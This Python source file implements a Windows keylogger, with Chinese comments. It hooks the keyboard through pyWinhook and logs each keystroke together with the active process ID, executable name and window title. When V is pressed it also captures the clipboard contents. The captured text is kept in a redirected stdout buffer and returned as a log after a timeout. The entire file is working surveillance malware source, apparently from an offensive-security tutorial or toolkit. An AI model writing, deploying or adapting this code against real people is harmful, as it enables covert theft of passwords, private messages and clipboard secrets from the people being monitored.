from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook
import sys
import time
import win32clipboard

TIMEOUT = 10


class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        # 返回当前活跃窗口句柄
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        # 通过句柄获取id
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f"{pid.value}"

        executable = create_string_buffer(512)
        # 打开进程
        h_process = windll.kernel32.OpenProcess(c_ulong(0x00040000), False, pid)
        # 找到实际的进程名
        windll.psapi.GetModuleBaseNameA(
            h_process, None, byref(executable), 512
        )

        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f"{e}: window name unknow")

        print("\n", process_id, executable.value.decode(), self.current_window)

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def my_key_stroke(self, event):
        if event.WindowName != self.current_window:
            self.get_current_process()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end="")
        else:
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f"[PASTE] - {value}")

            else:
                print(f"{event.Key}")

        return True


def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = KeyLogger()
    hm = pyWinhook.HookManager()
    hm.KeyDown = kl.my_key_stroke
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log


if __name__ == '__main__':
    print(run())
    print("done.")



